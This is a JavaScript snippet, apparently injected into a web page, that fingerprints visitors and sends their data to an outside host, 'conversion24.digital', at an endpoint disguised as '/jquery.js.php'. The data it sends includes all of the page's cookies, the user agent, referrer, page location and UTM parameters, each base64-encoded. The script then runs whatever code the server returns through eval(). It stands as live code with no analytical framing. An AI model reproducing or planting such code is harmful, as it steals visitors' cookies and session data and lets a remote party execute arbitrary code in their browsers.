		if (window.requestIdleCallback) {
			requestIdleCallback(function () {
				Fingerprint2.get(function (components) {
					include(components);
				})
			})
		} else {
			setTimeout(function () {
				Fingerprint2.get(function (components) {
					include(components);
				})  
			}, 500)
		}
		var Base64 = {

			_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

			encode : function (input) {
				var output = "";
				var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
				var i = 0;

				input = Base64._utf8_encode(input);

				while (i < input.length) {

					chr1 = input.charCodeAt(i++);
					chr2 = input.charCodeAt(i++);
					chr3 = input.charCodeAt(i++);

					enc1 = chr1 >> 2;
					enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
					enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
					enc4 = chr3 & 63;

					if (isNaN(chr2)) {
						enc3 = enc4 = 64;
					} else if (isNaN(chr3)) {
						enc4 = 64;
					}

					output = output +
					this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
					this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);

				}

				return output;
			},

			decode : function (input) {
				var output = "";
				var chr1, chr2, chr3;
				var enc1, enc2, enc3, enc4;
				var i = 0;

				input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

				while (i < input.length) {

					enc1 = this._keyStr.indexOf(input.charAt(i++));
					enc2 = this._keyStr.indexOf(input.charAt(i++));
					enc3 = this._keyStr.indexOf(input.charAt(i++));
					enc4 = this._keyStr.indexOf(input.charAt(i++));

					chr1 = (enc1 << 2) | (enc2 >> 4);
					chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
					chr3 = ((enc3 & 3) << 6) | enc4;

					output = output + String.fromCharCode(chr1);

					if (enc3 != 64) {
						output = output + String.fromCharCode(chr2);
					}
					if (enc4 != 64) {
						output = output + String.fromCharCode(chr3);
					}

				}

				output = Base64._utf8_decode(output);

				return output;

			},

			_utf8_encode : function (string) {
				string = string.toString().replace(/\r\n/g,"\n");
				var utftext = "";

				for (var n = 0; n < string.length; n++) {

					var c = string.charCodeAt(n);

					if (c < 128) {
						utftext += String.fromCharCode(c);
					}
					else if((c > 127) && (c < 2048)) {
						utftext += String.fromCharCode((c >> 6) | 192);
						utftext += String.fromCharCode((c & 63) | 128);
					}
					else {
						utftext += String.fromCharCode((c >> 12) | 224);
						utftext += String.fromCharCode(((c >> 6) & 63) | 128);
						utftext += String.fromCharCode((c & 63) | 128);
					}

				}

				return utftext;
			},

			_utf8_decode : function (utftext) {
				var string = "";
				var i = 0;
				var c = c1 = c2 = 0;

				while ( i < utftext.length ) {

					c = utftext.charCodeAt(i);

					if (c < 128) {
						string += String.fromCharCode(c);
						i++;
					}
					else if((c > 191) && (c < 224)) {
						c2 = utftext.charCodeAt(i+1);
						string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
						i += 2;
					}
					else {
						c2 = utftext.charCodeAt(i+1);
						c3 = utftext.charCodeAt(i+2);
						string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
						i += 3;
					}

				}

				return string;
			}
		}

		function decodeURIComponentSafe(uri, mod) {
			var out = new String(),
				arr,
				i = 0,
				l,
				x;
			typeof mod === "undefined" ? mod = 0 : 0;
			arr = uri.split(/(%(?:d0|d1)%.{2})/);
			for (l = arr.length; i < l; i++) {
				try {
					x = decodeURIComponent(arr[i]);
				} catch (e) {
					x = mod ? arr[i].replace(/%(?!\d+)/g, '%25') : arr[i];
				}
				out += x;
			}
			return out;
		}
		
		var date = new Date();
		 
		var url = '//conversion24.digital';
		
		var ts = '?ts=' + btoa(date.getMilliseconds());
		
		var parstring = '?s=1';
		
		var ua = '';		
		try {
		   ua = navigator.userAgent;
		}
		catch (e) {
		}
		
		if(ua.length) 	
			parstring += '&up=' + btoa(ua);
		
		var screensize = screen.width + "x" + screen.height + " (" + screen.availWidth + "x" + screen.availHeight + ") "  + screen.colorDepth + "x" + screen.pixelDepth;
		
		url += '/jquery.js.php' + parstring + ts + '&sc=' + btoa(screensize);
		var jspp22 = document.createElement('script');
		var userLang = navigator.language || navigator.userLanguage; 
		var utmQuery = decodeURIComponentSafe(window.location.search.substring(1)),
		  utmVariables = utmQuery.split('&'),
		  ParameterName,
		  i;
		
		function include(components) {
			var data = new FormData(); 
			var referrer = document.referrer;
			if(referrer.length) 
				data.append('rp', btoa(referrer));
			data.append('r', btoa(document.referrer));
			try {
			   data.append('u', btoa(navigator.userAgent));
			}
			catch (e) {
			}
			try {
				let tscookieValue = Math.floor(Date.now() / 1000);
				setCookie('ts', tscookieValue, 1);
				let tscookie = getCookie('ts');
				if(tscookie == tscookieValue)
					data.append('tscookie', btoa(tscookie));
			}
			catch (e) {
			}
			data.append('c', btoa(listCookies()));
			data.append('lang', btoa(userLang));
			data.append('utm', btoa(encodeURIComponent(utmQuery)));
			data.append('components', btoa(JSON.stringify(components)));
			data.append('history', btoa(window.history.length));
			data.append('location', btoa(window.location));
			var xmlHttp = new XMLHttpRequest();
			xmlHttp.onreadystatechange = function()
			{
				if(xmlHttp.readyState == 4 && xmlHttp.status == 200)
				{
					let result = xmlHttp.responseText;
					result = result.trim();
					eval(xmlHttp.responseText);
					if(!result.length)
						UnFreezeUI();
				}
			}
			xmlHttp.withCredentials = true;
			xmlHttp.open("post", ('https:' == document.location.protocol ? 'https://' : 'http://') + url, true); 
			xmlHttp.send(data); 
			return false;
		}		
		
		function listCookies(){
			
			var theCookies = document.cookie.split(';');
			
			var aString = '';
			
			for (var i = 1 ; i <= theCookies.length; i++) {
				aString += i + ' ' + theCookies[i-1] + "\n";
			}
			
			return aString;
		}
		
		function setCookie(cname, cvalue, exdays) {
		  var d = new Date();
		  d.setTime(d.getTime() + (exdays*24*60*60*1000));
		  var expires = "expires="+ d.toUTCString();
		  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
		}
		
		function getCookie(cname) {
		  var name = cname + "=";
		  var decodedCookie = decodeURIComponent(document.cookie);
		  var ca = decodedCookie.split(';');
		  for(var i = 0; i <ca.length; i++) {
			var c = ca[i];
			while (c.charAt(0) == ' ') {
			  c = c.substring(1);
			}
			if (c.indexOf(name) == 0) {
			  return c.substring(name.length, c.length);
			}
		  }
		  return "";
		}